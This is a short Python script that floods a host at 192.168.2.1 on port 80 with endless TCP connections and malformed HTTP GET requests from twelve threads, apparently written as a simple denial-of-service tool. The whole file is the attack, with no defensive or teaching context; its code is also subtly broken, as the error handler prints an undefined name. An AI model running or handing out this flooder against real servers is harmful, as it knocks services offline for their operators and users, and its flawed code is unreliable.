import socket
from threading import Thread

host = "192.168.2.1"
ip = host
port = 80

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip,port))
            mysocket.send(str.encode("GET" + "" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET" + "" + "HTTP/1.1 \r\n"), (ip,port))
        except socket.error:
            print(error)
        mysocket.close()
        print("dos")

for i in range(12):
    t = Thread(target=dos)
    t.start()